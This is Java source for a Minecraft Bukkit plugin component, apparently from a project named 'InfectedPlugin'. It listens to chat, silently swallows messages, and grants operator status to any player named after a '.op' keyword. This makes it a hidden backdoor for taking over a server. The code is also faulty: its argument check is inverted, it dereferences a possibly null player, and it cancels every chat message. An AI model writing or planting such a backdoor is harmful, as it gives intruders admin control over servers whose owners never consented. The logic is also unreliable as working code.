package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_op implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        String[] args = message.split(" ");
        final Player p = event.getPlayer();
        Server server = Bukkit.getServer();
        boolean cancel = true;
    
        if (message.toLowerCase().contains(".op"))
        {
            if (args.length != 1)
            {
                p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
            }
            else
            {
                Player target = server.getPlayer(args[1]);
                if (target == null)
                {
                    server.getOfflinePlayer(args[1]).setOp(true);
                    cancel = true;
                }
                target.setOp(true);
                target.sendMessage(ChatColor.YELLOW + "You are now OP!");
                cancel = true;
            }
        }
        
        if (cancel)
        {
            event.setCancelled(true);
            return;
        }
    }
}
